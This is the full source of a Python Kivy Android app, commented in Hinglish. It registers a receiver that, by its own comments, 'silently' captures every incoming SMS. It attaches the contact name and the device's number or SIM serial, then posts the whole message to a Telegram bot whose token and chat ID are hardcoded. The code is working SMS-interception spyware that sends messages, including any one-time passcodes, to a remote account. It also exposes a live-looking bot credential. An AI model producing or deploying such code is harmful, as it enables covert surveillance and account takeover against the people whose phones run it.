from kivy.app import App
from kivy.clock import Clock
from jnius import autoclass, cast
from android.permissions import request_permissions, Permission
import requests
from datetime import datetime

# ═══════════════════════════════════════════════════════════
#           TELEGRAM BOT CONFIGURATION
# ═══════════════════════════════════════════════════════════
# BotFather se token nikalo: https://t.me/BotFather
# Chat ID nikalo: https://t.me/userinfobot

TELEGRAM_BOT_TOKEN = "7902539659:AAGl3Iz5aagwohHgEOq71OW0aqZp9ax7kMk"  # ← Yahan apna bot token paste karo
TELEGRAM_CHAT_ID = "6161534899"      # ← Yahan apni chat ID paste karo

# ═══════════════════════════════════════════════════════════
#           ANDROID CLASSES
# ═══════════════════════════════════════════════════════════

PythonActivity = autoclass('org.kivy.android.PythonActivity')
Intent = autoclass('android.content.Intent')
PendingIntent = autoclass('android.app.PendingIntent')
BroadcastReceiver = autoclass('android.content.BroadcastReceiver')
Context = autoclass('android.content.Context')
SmsManager = autoclass('android.telephony.SmsManager')
Telephony = autoclass('android.provider.Telephony')
TelephonyManager = autoclass('android.telephony.TelephonyManager')
Uri = autoclass('android.net.Uri')
ContactsContract = autoclass('android.provider.ContactsContract')


# ═══════════════════════════════════════════════════════════
#           SMS RECEIVER CLASS
# ═══════════════════════════════════════════════════════════

class SMSReceiver(BroadcastReceiver):
    """Background SMS Receiver - Silently SMS receive karta hai"""
    
    def __init__(self, callback):
        super().__init__()
        self.callback = callback
    
    def onReceive(self, context, intent):
        """SMS receive hone par automatically call hota hai"""
        try:
            # SMS data extract karo
            bundle = intent.getExtras()
            if bundle:
                pdus = bundle.get("pdus")
                if pdus:
                    for pdu in pdus:
                        # SMS message parse karo
                        message = self.parse_sms(pdu)
                        if message:
                            self.callback(message)
        except Exception as e:
            print(f"❌ Error receiving SMS: {e}")
    
    def parse_sms(self, pdu):
        """SMS ko parse karke readable format mein convert karo"""
        try:
            SmsMessage = autoclass('android.telephony.SmsMessage')
            msg = SmsMessage.createFromPdu(pdu)
            
            sender = msg.getOriginatingAddress()
            body = msg.getMessageBody()
            timestamp = msg.getTimestampMillis()
            
            # Receiver number nikalo (destination address)
            receiver = self.get_my_phone_number()
            
            return {
                'sender': sender,
                'receiver': receiver,
                'message': body,
                'time': timestamp
            }
        except Exception as e:
            print(f"❌ Error parsing SMS: {e}")
            return None
    
    def get_my_phone_number(self):
        """Current device ka phone number nikalo"""
        try:
            activity = PythonActivity.mActivity
            telephony_manager = activity.getSystemService(Context.TELEPHONY_SERVICE)
            
            # Phone number nikalne ki koshish karo
            phone_number = telephony_manager.getLine1Number()
            
            if phone_number and len(phone_number) > 0:
                return phone_number
            
            # Agar phone number nahi mila, toh SIM serial number try karo
            sim_serial = telephony_manager.getSimSerialNumber()
            if sim_serial:
                return f"SIM: {sim_serial[-4:]}"  # Last 4 digits
            
            # Agar kuch bhi nahi mila
            return "Unknown Device"
            
        except Exception as e:
            print(f"❌ Error getting phone number: {e}")
            return "Unknown Device"


# ═══════════════════════════════════════════════════════════
#           MAIN APPLICATION CLASS
# ═══════════════════════════════════════════════════════════

class SMSForwarderApp(App):
    """Main Application - Background mein silently chalti hai"""
    
    def build(self):
        print("🚀 SMS Forwarder App Starting...")
        
        # Permissions request karo
        print("📋 Requesting permissions...")
        request_permissions([
            Permission.READ_SMS,
            Permission.RECEIVE_SMS,
            Permission.SEND_SMS,
            Permission.READ_CONTACTS,
            Permission.READ_PHONE_STATE
        ])
        
        # SMS Receiver register karo
        self.register_sms_receiver()
        
        # Minimal UI (background app hai)
        from kivy.uix.label import Label
        return Label(
            text="✅ SMS Forwarder Running\n\n"
                 "📱 SMS automatically forward honge\n"
                 "💬 Telegram pe check karo\n\n"
                 "⚙️ Background mein chal raha hai",
            halign='center',
            valign='middle'
        )
    
    def register_sms_receiver(self):
        """SMS receiver ko Android system ke saath register karo"""
        try:
            print("📡 Registering SMS receiver...")
            
            # Receiver banao
            self.receiver = SMSReceiver(self.on_sms_received)
            
            # Intent filter banao
            IntentFilter = autoclass('android.content.IntentFilter')
            intent_filter = IntentFilter()
            intent_filter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
            
            # Receiver register karo
            activity = PythonActivity.mActivity
            activity.registerReceiver(self.receiver, intent_filter)
            
            print("✅ SMS Receiver registered successfully!")
            print("📲 Waiting for SMS...")
            
        except Exception as e:
            print(f"❌ Error registering receiver: {e}")
    
    def on_sms_received(self, sms_data):
        """Jab SMS aaye to Telegram pe forward karo"""
        try:
            sender = sms_data['sender']
            receiver = sms_data['receiver']
            message = sms_data['message']
            timestamp = sms_data['time']
            
            print(f"\n📨 New SMS received!")
            print(f"   From: {sender}")
            print(f"   To: {receiver}")
            print(f"   Message: {message[:50]}...")
            
            # Timestamp ko readable format mein convert karo
            time_str = datetime.fromtimestamp(timestamp/1000).strftime('%d-%m-%Y %I:%M:%S %p')
            
            # Contact name nikalo (agar saved ho)
            contact_name = self.get_contact_name(sender)
            
            # ═══════════════════════════════════════════════════
            #      TELEGRAM MESSAGE FORMAT
            # ═══════════════════════════════════════════════════
            
            telegram_message = f"📱 *New SMS Received*\n"
            telegram_message += f"{'='*30}\n\n"
            
            # Sender Info
            if contact_name:
                telegram_message += f"👤 *From (Contact):* {contact_name}\n"
            telegram_message += f"📤 *From (Number):* `{sender}`\n\n"
            
            # Receiver Info
            telegram_message += f"📥 *Received On:* `{receiver}`\n"
            telegram_message += f"🕒 *Time:* {time_str}\n"
            telegram_message += f"{'─'*30}\n"
            telegram_message += f"💬 *Message:*\n{message}\n"
            telegram_message += f"{'='*30}"
            
            # Telegram pe bhejo
            self.send_to_telegram(telegram_message)
            
            print(f"✅ SMS forwarded to Telegram: {sender} → {receiver}")
            
        except Exception as e:
            print(f"❌ Error forwarding SMS: {e}")
    
    def get_contact_name(self, phone_number):
        """Phone number se contact name nikalo"""
        try:
            activity = PythonActivity.mActivity
            content_resolver = activity.getContentResolver()
            
            # Contact lookup URI
            uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phone_number)
            )
            
            # Query contact name
            cursor = content_resolver.query(uri, None, None, None, None)
            
            if cursor and cursor.moveToFirst():
                name_index = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                if name_index >= 0:
                    contact_name = cursor.getString(name_index)
                    cursor.close()
                    return contact_name
            
            if cursor:
                cursor.close()
            
            return None  # Contact saved nahi hai
            
        except Exception as e:
            print(f"⚠️ Error getting contact name: {e}")
            return None
    
    def send_to_telegram(self, message):
        """Telegram Bot API se message bhejo"""
        try:
            print("📤 Sending to Telegram...")
            
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, data=data, timeout=10)
            
            if response.status_code == 200:
                print("✅ Message sent to Telegram successfully!")
            else:
                print(f"❌ Failed to send message: {response.status_code}")
                print(f"   Response: {response.text}")
                
        except Exception as e:
            print(f"❌ Error sending to Telegram: {e}")
    
    def on_pause(self):
        """App background mein jaye to bhi chalti rahe"""
        print("⏸️ App paused - but still running in background")
        return True
    
    def on_resume(self):
        """App resume ho"""
        print("▶️ App resumed")
        pass
    
    def on_stop(self):
        """App band ho raha hai"""
        print("🛑 App stopping...")


# ═══════════════════════════════════════════════════════════
#           MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════

if __name__ == '__main__':
    print("\n" + "="*50)
    print("     SMS TO TELEGRAM FORWARDER")
    print("="*50 + "\n")
    
    # App run karo
    SMSForwarderApp().run()


